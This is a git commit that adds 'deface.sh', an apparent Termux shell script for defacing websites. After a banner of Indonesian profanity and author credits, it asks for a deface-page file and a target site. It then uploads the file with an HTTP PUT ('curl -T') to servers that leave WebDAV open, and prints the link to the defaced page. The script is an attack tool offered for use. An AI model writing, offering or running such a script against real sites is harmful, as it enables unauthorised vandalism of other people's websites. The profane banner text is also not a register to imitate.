d19f8034463fe2036f3ddd47efdd7a1dd3cd3414
MRD4N <53118406+MrD4N@users.noreply.github.com>
2019-08-08 00:05:40 +0700

    Add files via upload

---
+++ deface.sh
@@ -0,0 +1,21 @@
+figlet Webdav By : | lolcat
+figlet Mr.D4N | lolcat
+echo "Jangan Di Recode Bangsad" | lolcat
+echo "Jangan DiPerjual Belikan Ngentod" | lolcat
+echo "=======================================================" | lolcat
+figlet Mr.D4N | lolcat
+echo "Coded By           : Mr.D4N" | lolcat
+echo "github             : https://github.com/MRD4N" | lolcat
+echo "Team               : Bird Army Squad" | lolcat
+echo "Thanks To          : Alloh SWT" | lolcat
+echo "======================================================" | lolcat
+echo ""
+echo "Pastikan Punya Script Defacenya Yha Bangsad :v" | lolcat
+read -p "Masukkan Nama Script Defacenya Ngentod :" script;
+read -p "Masukkan Web Yang Mau Dideface Ngentod :" web;
+echo "SEDANG MEN-DEFACE NGENTOD................:v" | lolcat
+termux-setup-storage
+curl -T /sdcard/$script $web
+echo "Berhasil DiDeface Ngentod .. Buka Hasilnya Disini : $web/$script" | lolcat
+
+
